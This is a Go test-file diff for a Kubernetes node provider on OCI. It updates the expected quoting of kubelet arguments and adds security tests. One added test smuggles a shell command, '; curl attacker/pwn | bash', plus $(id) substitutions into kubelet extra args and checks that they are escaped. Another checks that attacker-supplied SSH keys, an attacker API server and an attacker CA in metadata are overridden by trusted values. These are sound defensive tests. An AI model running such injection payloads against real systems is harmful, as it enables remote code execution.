@@ -390,16 +390,16 @@ func TestProvider_AppendKubeletConfigs(t *testing.T) {
 				" --pods-per-core=10" +
 				" --eviction-hard='memory.available<10M'" +
 				" --eviction-soft='memory.available<50M'" +
-				" --system-reserved=\"sr1=srv1\"" +
-				" --kube-reserved=\"kr1=krv1\"" +
+				" --system-reserved=\\\"sr1=srv1\\\"" +
+				" --kube-reserved=\\\"kr1=krv1\\\"" +
 				" --eviction-soft-grace-period='memory.available=2s'" +
 				" --eviction-max-pod-grace-period=50" +
 				" --image-gc-high-threshold=2000" +
 				" --image-gc-low-threshold=1000" +
-				" --node-labels=\"key1=value1\"" +
+				" --node-labels=\\\"key1=value1\\\"" +
 				" --max-open-files=1000 --maximum-dead-containers=10" +
-				" --register-with-taints=\"key1=present:NoSchedule," +
-				"key2=value2:NoExecute,karpenter.sh/unregistered=present:NoExecute\"\"",
+				" --register-with-taints=\\\"key1=present:NoSchedule," +
+				"key2=value2:NoExecute,karpenter.sh/unregistered=present:NoExecute\\\"\"",
 		},
 		{
 			&ociv1beta1.KubeletConfiguration{
@@ -409,7 +409,7 @@ func TestProvider_AppendKubeletConfigs(t *testing.T) {
 				Spec: corev1.NodeClaimSpec{},
 			},
 			" \\\n --kubelet-extra-args \"" +
-				" --max-pods=110 --register-with-taints=\"karpenter.sh/unregistered=present:NoExecute\"\""},
+				" --max-pods=110 --register-with-taints=\\\"karpenter.sh/unregistered=present:NoExecute\\\"\""},
 	}
 
 	for _, tc := range testCases {
@@ -435,6 +435,33 @@ func TestProvider_AppendKubeletConfigs(t *testing.T) {
 		t.Logf("expected = '%s', actual = '%s'", expectedResult, result)
 		assert.Equal(t, expectedResult, result)
 	}
+}
+
+func TestProvider_AppendKubeletExtraArgsEscapesShellMetacharacters(t *testing.T) {
+	teardownTest := setupTest(t)
+	defer teardownTest(t)
+
+	extraArgs := "--node-status-update-frequency=10s\" ; curl attacker/pwn | bash ; echo \" --foo=$(id) --bar=`id`"
+	testNodeClass := &ociv1beta1.OCINodeClass{
+		Spec: ociv1beta1.OCINodeClassSpec{
+			NetworkConfig: &ociv1beta1.NetworkConfig{},
+			KubeletConfig: &ociv1beta1.KubeletConfiguration{
+				ExtraArgs: lo.ToPtr(extraArgs),
+			},
+		},
+	}
+
+	bakedImage, err := provider.buildUserDataForPreBakedImage(nil, testNodeClass)
+	require.NoError(t, err)
+
+	decodedByte, err := base64.StdEncoding.DecodeString(bakedImage)
+	require.NoError(t, err)
+	result := string(decodedByte)
+
+	assert.Contains(t, result, `--node-status-update-frequency=10s\" ; curl attacker/pwn | bash ; echo \"`)
+	assert.Contains(t, result, `--foo=\$(id)`)
+	assert.Contains(t, result, "--bar=\\`id\\`")
+	assert.Equal(t, 1, strings.Count(result, `--kubelet-extra-args "`))
 }
 
 func expectedResult(provider *DefaultProvider, suffix string) string {
@@ -738,7 +765,7 @@ func TestProvider_BuildInstanceMetadata(t *testing.T) {
 			assertion: func(t *testing.T, meta map[string]string) {
 				decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
 				require.NoError(t, derr)
-				assert.Contains(t, string(decoded), "--register-with-taints=\"karpenter.sh/unregistered=present:NoExecute\"")
+				assert.Contains(t, string(decoded), "--register-with-taints=\\\"karpenter.sh/unregistered=present:NoExecute\\\"")
 			},
 		},
 		{
@@ -1063,7 +1090,16 @@ func TestProvider_BuildInstanceMetadata_CustomUserData_PassThroughAndAugment(t *
 
 	nc := newNodeClass()
 	// Provide customer user_data directly; production must not replace it with default
-	nc.Spec.Metadata = map[string]string{"user_data": "CUSTOM_SCRIPT"}
+	nc.Spec.Metadata = map[string]string{
+		"user_data":           "CUSTOM_SCRIPT",
+		"custom_key":          "CUSTOM_VALUE",
+		"ssh_authorized_keys": "ssh-rsa ATTACKER",
+		"apiserver_host":      "ATTACKER_API_SERVER",
+		"cluster_ca_cert":     "ATTACKER_CA",
+		"kubedns_svc_ip":      "ATTACKER_DNS",
+		"kubelet-extra-args":  "ATTACKER_KUBELET_ARGS",
+	}
+	nc.Spec.SshAuthorizedKeys = []string{"ssh-rsa TRUSTED"}
 	// Add kubelet and labels for augmentation
 	nc.Spec.KubeletConfig = &ociv1beta1.KubeletConfiguration{
 		ClusterDNS: []string{"dns1", "dns2"},
@@ -1082,6 +1118,7 @@ func TestProvider_BuildInstanceMetadata_CustomUserData_PassThroughAndAugment(t *
 
 	// user_data is passed through unchanged (not base64-encoded)
 	assert.Equal(t, "CUSTOM_SCRIPT", meta["user_data"])
+	assert.Equal(t, "CUSTOM_VALUE", meta["custom_key"])
 
 	// Augmented keys present
 	assert.Equal(t, "dns1,dns2", meta["kubedns_svc_ip"])
@@ -1091,6 +1128,7 @@ func TestProvider_BuildInstanceMetadata_CustomUserData_PassThroughAndAugment(t *
 
 	assert.Equal(t, "10.8.0.1", meta["apiserver_host"])
 	assert.Equal(t, p.caString, meta["cluster_ca_cert"])
+	assert.Equal(t, "ssh-rsa TRUSTED", meta["ssh_authorized_keys"])
 
 	// Node labels injected and quoted
 	assert.Equal(t, "\"k=v\"", meta["oke-initial-node-labels"])
